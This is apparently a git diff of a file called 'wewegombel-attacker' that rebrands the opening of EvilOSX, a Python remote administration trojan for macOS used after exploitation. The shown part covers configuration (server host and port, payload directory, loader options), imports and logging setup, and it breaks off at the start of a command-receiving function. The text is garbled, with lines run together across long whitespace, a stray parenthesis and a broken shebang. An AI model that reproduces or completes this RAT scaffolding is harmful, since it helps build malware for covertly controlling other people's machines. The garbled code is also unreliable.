@@ -1,7 +1,7 @@
 ## Welcome to wewegombel-attacker
 
 ##usr/bin/env python                                                                     # -*- coding: utf-8 -*-                                                                   """EvilOSX is a pure python, post-exploitation, RAT (Remote Administration Tool) for macOS / OSX."""
-# Random Hash: This text will be replaced when building WeWeGomBel-Attacker               __author__ = "godeyes"                                                                    __license__ = "GPLv3"
+# wewegombeln hash: This tool will kill server when building WeWeGomBel-Attacker               __author__ = "godeyes"                                                                    __license__ = "GPLv3"
 __version__ = "2.1.2"                                                                                                                                                               import time
 import urllib2
 import urllib                                                                             import random
@@ -18,9 +18,9 @@ import sys
 import ssl
 import logging                                                                            
 SERVER_HOST = "127.0.0.1"
-SERVER_PORT = 1337                                                                        PROGRAM_DIRECTORY = os.path.expanduser("")  # The program directory where EvilOSX lives (s
+SERVER_PORT = 1337                                                                        PROGRAM_DIRECTORY = os.path.expanduser("")  # The program directory where WeweGombel_attacker 
 tores files).
-LOADER_OPTIONS = "php")  # Loader options, used to remove/update this payload later.
+LOADER_OPTIONS = "python3")  # Loader options, used to remove/update this payload later.
 
 COMMAND_INTERVAL = 0.5  # Interval in seconds to check for commands.                      IDLE_TIME = 60  # Time in seconds after which the client will become idle.
 
@@ -29,6 +29,7 @@ MESSAGE_INFO = "\033[94m" + "[I] " + "\033[0m"                                  
 # Loggingi                                                                                logging.basicConfig(format="[%(levelname)s] %(funcName)s:%(lineno)s - %(message)s", level=
 logging.DEBUG)
 log = logging.getLogger(__name__)
+
 
 
 def receive_command():
